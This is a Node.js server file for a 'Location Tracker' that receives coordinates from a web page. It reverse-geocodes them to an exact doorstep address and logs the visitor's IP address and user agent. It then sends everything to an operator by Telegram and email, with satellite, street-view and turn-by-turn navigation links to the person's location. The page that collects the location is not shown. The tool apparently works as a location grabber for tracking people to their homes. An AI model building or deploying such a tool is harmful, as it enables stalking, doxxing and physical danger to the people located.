// server.js
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const nodemailer = require('nodemailer');

const app = express();
const PORT = process.env.PORT || 3000;

// --- CONFIGURATION ---
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

const EMAIL_SERVICE = process.env.EMAIL_SERVICE || 'gmail';
const EMAIL_USER = process.env.EMAIL_USER;
const EMAIL_PASS = process.env.EMAIL_PASS;
const EMAIL_TO = process.env.EMAIL_TO || process.env.EMAIL_USER;

// Configure nodemailer transporter if credentials are provided
let mailTransporter = null;
if (EMAIL_USER && EMAIL_PASS) {
    mailTransporter = nodemailer.createTransport({
        service: EMAIL_SERVICE,
        auth: {
            user: EMAIL_USER,
            pass: EMAIL_PASS
        }
    });
}

// --- MIDDLEWARE SETUP ---
app.use(cors());
app.use(express.json());

// Serve static files from root directory (including index.html and any assets)
app.use(express.static(__dirname));

// Route GET / to index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Status endpoint to check configuration
app.get('/api/status', (req, res) => {
    res.json({
        telegramConfigured: !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID),
        emailConfigured: !!(EMAIL_USER && EMAIL_PASS),
        telegramAccount: TELEGRAM_CHAT_ID ? `Configured (Chat ID: ${TELEGRAM_CHAT_ID})` : 'Not Configured',
        emailRecipient: EMAIL_TO
    });
});

// Helper: Reverse geocode coordinates to exact doorstep street address, colony & postal code
async function reverseGeocode(lat, lon) {
    try {
        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, {
            headers: { 'User-Agent': 'LocationNotifier/3.0 (contact: admin@location.local)' },
            signal: AbortSignal.timeout(4000)
        });
        if (res.ok) {
            const data = await res.json();
            const a = data.address || {};
            const door = a.house_number || a.building || a.amenity || a.office || a.shop || '';
            const road = a.road || a.pedestrian || a.street || a.lane || a.footway || '';
            const locality = a.suburb || a.neighbourhood || a.residential || a.subdistrict || a.quarter || '';
            const city = a.city || a.town || a.village || a.county || '';
            const state = a.state || '';
            const postcode = a.postcode || '';

            const specificParts = [door, road, locality, city, state, postcode].filter(Boolean);
            const formatted = specificParts.length >= 2 ? specificParts.join(', ') : (data.display_name || '');

            return {
                displayName: formatted,
                road: road,
                suburb: locality,
                city: city,
                state: state,
                postcode: postcode,
                country: a.country || ''
            };
        }
    } catch (e) {}

    try {
        const res2 = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=en`, {
            signal: AbortSignal.timeout(3000)
        });
        if (res2.ok) {
            const d2 = await res2.json();
            return {
                displayName: [d2.locality, d2.principalSubdivision, d2.countryName].filter(Boolean).join(', '),
                road: '',
                suburb: d2.locality || '',
                city: d2.city || d2.locality || '',
                state: d2.principalSubdivision || '',
                postcode: d2.postcode || '',
                country: d2.countryName || ''
            };
        }
    } catch (e2) {}

    return null;
}

// =======================================================
// 📡 THE API ENDPOINT: Receives location from frontend
// =======================================================
app.post('/api/location', async (req, res) => {
    const { latitude, longitude, accuracy, altitude, speed, heading, city, region, country, address, postcode, source } = req.body;

    if (!latitude || !longitude) {
        return res.status(400).json({ success: false, message: "Missing coordinates!" });
    }

    // Client metadata
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const timestamp = new Date().toISOString();
    const formattedDate = new Date().toLocaleString('en-US', { timeZone: 'Asia/Kolkata' }) + ' (IST)';

    // Reverse geocode to exact building/street level if not provided
    let geo = null;
    if (!address) {
        try {
            geo = await reverseGeocode(latitude, longitude);
        } catch {}
    }

    const resolvedAddress = address || (geo && geo.displayName) || '';
    const resolvedCity = (geo && geo.city) || city || '';
    const resolvedRegion = (geo && geo.state) || region || '';
    const resolvedCountry = (geo && geo.country) || country || '';
    const resolvedPostcode = postcode || (geo && geo.postcode) || '';
    const resolvedRoad = (geo && geo.road) || '';
    const resolvedSuburb = (geo && geo.suburb) || '';

    // Precision Quality Badge (like Google Maps / Blinkit / Zepto)
    let accuracyBadge = '📡 Network Triangulation';
    let precisionDesc = 'ISP Gateway / Area level';
    let isDoorstep = false;

    if (accuracy && accuracy <= 10) {
        accuracyBadge = `🎯 ${accuracy} meters (🛰️ Doorstep Satellite GPS)`;
        precisionDesc = 'Exact building & doorstep level (Blinkit/Zepto grade)';
        isDoorstep = true;
    } else if (accuracy && accuracy <= 35) {
        accuracyBadge = `🎯 ${accuracy} meters (🛰️ High-Accuracy GPS / Wi-Fi)`;
        precisionDesc = 'Street & plot level accuracy';
    } else if (accuracy && accuracy <= 100) {
        accuracyBadge = `🎯 ${accuracy} meters (📶 Wi-Fi Triangulation)`;
        precisionDesc = 'Neighborhood / block level';
    } else if (accuracy) {
        accuracyBadge = `🎯 ${accuracy} meters (📡 Cell-Tower / ISP)`;
        precisionDesc = 'Town / cell-tower hub level';
    }

    const satelliteUrl = `https://www.google.com/maps/place/${latitude},${longitude}/@${latitude},${longitude},19z/data=!3m1!1e3`;
    const navUrl = `https://www.google.com/maps/dir/?api=1&destination=${latitude},${longitude}&travelmode=driving`;
    const streetViewUrl = `https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${latitude},${longitude}`;
    const openStreetUrl = `https://www.openstreetmap.org/?mlat=${latitude}&mlon=${longitude}#map=19/${latitude}/${longitude}`;

    console.log(`\n======================================================`);
    console.log(`📍 NEW LOCATION RECEIVED: ${latitude}, ${longitude}`);
    if (resolvedAddress) console.log(`🏠 Address: ${resolvedAddress}`);
    if (resolvedCity) console.log(`🏙️ City: ${resolvedCity}, ${resolvedRegion} (${resolvedCountry}) [PIN: ${resolvedPostcode}]`);
    console.log(`🎯 Accuracy: ${accuracy ? accuracy + ' meters' : 'Network positioning'} - ${precisionDesc}`);
    console.log(`📡 Method: ${source || (isDoorstep ? 'Hardware Satellite GNSS' : 'Browser Positioning')}`);
    console.log(`🕒 Timestamp: ${formattedDate}`);
    console.log(`🌐 Google Maps Satellite: ${satelliteUrl}`);
    console.log(`======================================================\n`);

    const deliveryStatus = {
        telegram: { attempted: false, success: false, note: '' },
        email: { attempted: false, success: false, note: '' }
    };

    // 1. SEND VIA TELEGRAM
    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
        deliveryStatus.telegram.attempted = true;
        try {
            const addressBlock = resolvedAddress ? `🏠 <b>Exact Doorstep Address:</b>\n<code>${resolvedAddress}</code>\n\n` : '';
            const roadBlock = resolvedRoad ? `🛣️ <b>Road:</b> ${resolvedRoad}\n` : '';
            const suburbBlock = resolvedSuburb ? `🏘️ <b>Colony/Area:</b> ${resolvedSuburb}\n` : '';
            const pinBlock = resolvedPostcode ? `📮 <b>Postal PIN:</b> <code>${resolvedPostcode}</code>\n` : '';
            const cityBlock = resolvedCity ? `🏙️ <b>City:</b> ${resolvedCity}${resolvedRegion ? ', ' + resolvedRegion : ''}${resolvedCountry ? ' (' + resolvedCountry + ')' : ''}\n` : '';

            const telegramMessage = 
`📍 <b>${isDoorstep ? '🛰️ DOORSTEP GPS LOCKED (Blinkit/Zepto Precision)!' : '📍 LOCATION DETECTED'}</b>

🎯 <b>Precision:</b> ${accuracyBadge}
🔍 <b>Quality:</b> <i>${precisionDesc}</i>

${addressBlock}${roadBlock}${suburbBlock}${pinBlock}${cityBlock}🌍 <b>Coordinates:</b> <code>${latitude}, ${longitude}</code>
📡 <b>Positioning Method:</b> ${source || (isDoorstep ? 'Hardware GNSS Satellite' : 'Browser Positioning')}
${speed ? `🏎️ <b>Movement Speed:</b> ${speed} m/s\n` : ''}${heading ? `🧭 <b>Heading:</b> ${heading}°\n` : ''}${altitude ? `⛰️ <b>Altitude:</b> ${altitude} m\n` : ''}🕒 <b>Detected At:</b> ${formattedDate}
🌐 <b>IP Address:</b> <code>${clientIp}</code>

🗺️ <a href="${satelliteUrl}">3D Rooftop Satellite View (Google Maps)</a>
🧭 <a href="${navUrl}">Turn-by-Turn GPS Navigation (Blinkit Route)</a>
📸 <a href="${streetViewUrl}">Google 360° Street View</a>
🗺️ <a href="${openStreetUrl}">OpenStreetMap (House Numbers)</a>`;

            await sendTelegramMessage(telegramMessage);
            deliveryStatus.telegram.success = true;
            deliveryStatus.telegram.note = 'Delivered to Telegram';
            console.log('✅ Sent location notification to Telegram!');
        } catch (error) {
            console.error('❌ Error sending to Telegram:', error.message);
            deliveryStatus.telegram.note = error.message;
        }
    } else {
        deliveryStatus.telegram.note = 'Telegram not fully configured in .env (TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID required)';
        console.log(`⚠️ Telegram not configured: ${deliveryStatus.telegram.note}`);
    }

    // 2. SEND VIA EMAIL
    if (EMAIL_USER && EMAIL_PASS) {
        deliveryStatus.email.attempted = true;
        try {
            await sendEmailNotification({
                latitude,
                longitude,
                accuracy,
                clientIp,
                userAgent,
                formattedDate,
                googleMapsUrl: satelliteUrl
            });
            deliveryStatus.email.success = true;
            deliveryStatus.email.note = `Delivered to ${EMAIL_TO}`;
            console.log(`✅ Sent location notification to Email (${EMAIL_TO})!`);
        } catch (error) {
            console.error('❌ Error sending Email:', error.message);
            deliveryStatus.email.note = error.message;
        }
    } else {
        deliveryStatus.email.note = 'Gmail App Password (EMAIL_PASS) not set in .env';
    }

    res.status(200).json({
        success: true,
        message: 'Location received successfully!',
        coordinates: { latitude, longitude, accuracy },
        address: resolvedAddress,
        postcode: resolvedPostcode,
        googleMapsUrl: satelliteUrl,
        navigationUrl: navUrl,
        delivery: deliveryStatus
    });
});

// =======================================================
// ✉️ HELPER FUNCTIONS (Telegram & Email Sending Logic)
// =======================================================

async function sendTelegramMessage(htmlText) {
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    // Built-in global fetch (Node 18+)
    const response = await fetch(telegramUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: htmlText,
            parse_mode: 'HTML',
            disable_web_page_preview: false
        }),
    });

    const data = await response.json();
    if (!response.ok || !data.ok) {
        throw new Error(data.description || `Telegram API error status ${response.status}`);
    }
    return data;
}

async function sendEmailNotification({ latitude, longitude, accuracy, clientIp, userAgent, formattedDate, googleMapsUrl }) {
    if (!mailTransporter) {
        mailTransporter = nodemailer.createTransport({
            service: EMAIL_SERVICE,
            auth: {
                user: EMAIL_USER,
                pass: EMAIL_PASS
            }
        });
    }

    const htmlContent = `
    <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; max-width: 600px; margin: 0 auto; background: #ffffff; border-radius: 12px; overflow: hidden; border: 1px solid #e1e4e8; box-shadow: 0 4px 12px rgba(0,0,0,0.08);">
        <div style="background: linear-gradient(135deg, #1e3a8a, #3b82f6); padding: 24px; color: #ffffff; text-align: center;">
            <h1 style="margin: 0; font-size: 24px; font-weight: 700;">📍 Location Tracker Alert</h1>
            <p style="margin: 8px 0 0 0; opacity: 0.9; font-size: 14px;">A new location report was submitted</p>
        </div>
        <div style="padding: 28px;">
            <table style="width: 100%; border-collapse: collapse; margin-bottom: 24px;">
                <tr style="border-bottom: 1px solid #f0f0f0;">
                    <td style="padding: 12px 0; color: #64748b; font-weight: 600; width: 140px;">Latitude</td>
                    <td style="padding: 12px 0; color: #0f172a; font-family: monospace; font-size: 15px; font-weight: bold;">${latitude}</td>
                </tr>
                <tr style="border-bottom: 1px solid #f0f0f0;">
                    <td style="padding: 12px 0; color: #64748b; font-weight: 600;">Longitude</td>
                    <td style="padding: 12px 0; color: #0f172a; font-family: monospace; font-size: 15px; font-weight: bold;">${longitude}</td>
                </tr>
                <tr style="border-bottom: 1px solid #f0f0f0;">
                    <td style="padding: 12px 0; color: #64748b; font-weight: 600;">Accuracy</td>
                    <td style="padding: 12px 0; color: #0f172a;">${accuracy ? accuracy + ' meters' : 'Not reported'}</td>
                </tr>
                <tr style="border-bottom: 1px solid #f0f0f0;">
                    <td style="padding: 12px 0; color: #64748b; font-weight: 600;">Time (IST)</td>
                    <td style="padding: 12px 0; color: #0f172a;">${formattedDate}</td>
                </tr>
                <tr style="border-bottom: 1px solid #f0f0f0;">
                    <td style="padding: 12px 0; color: #64748b; font-weight: 600;">IP Address</td>
                    <td style="padding: 12px 0; color: #0f172a; font-family: monospace;">${clientIp}</td>
                </tr>
                <tr>
                    <td style="padding: 12px 0; color: #64748b; font-weight: 600;">User Agent</td>
                    <td style="padding: 12px 0; color: #64748b; font-size: 12px; word-break: break-all;">${userAgent}</td>
                </tr>
            </table>

            <div style="text-align: center; margin: 30px 0 10px 0;">
                <a href="${googleMapsUrl}" target="_blank" style="display: inline-block; background-color: #2563eb; color: #ffffff; padding: 14px 28px; font-size: 16px; font-weight: 600; text-decoration: none; border-radius: 8px; box-shadow: 0 4px 6px -1px rgba(37, 99, 235, 0.2);">
                    🗺️ Open in Google Maps
                </a>
            </div>
        </div>
        <div style="background-color: #f8fafc; padding: 16px; text-align: center; color: #94a3b8; font-size: 12px; border-top: 1px solid #e2e8f0;">
            Sent to ${EMAIL_TO} by Location Tracker Server
        </div>
    </div>
    `;

    const plainText = 
`Location Tracker Alert:
Latitude: ${latitude}
Longitude: ${longitude}
Accuracy: ${accuracy ? accuracy + 'm' : 'N/A'}
Time: ${formattedDate}
IP: ${clientIp}
Map Link: ${googleMapsUrl}`;

    return mailTransporter.sendMail({
        from: `"Location Tracker" <${EMAIL_USER}>`,
        to: EMAIL_TO,
        subject: `📍 New Location Alert: [${latitude}, ${longitude}]`,
        text: plainText,
        html: htmlContent
    });
}

// =======================================================
// 🚀 START THE SERVER (Local vs Vercel Serverless)
// =======================================================
if (!process.env.VERCEL) {
    app.listen(PORT, () => {
        console.log('======================================================');
        console.log(`🚀 Location Tracker Server running on http://localhost:${PORT}`);
        console.log(`📱 Telegram Webhook: ${TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID ? '✅ Configured' : '❌ PENDING (.env required)'}`);
        console.log('======================================================\n');
    });
}

module.exports = app;
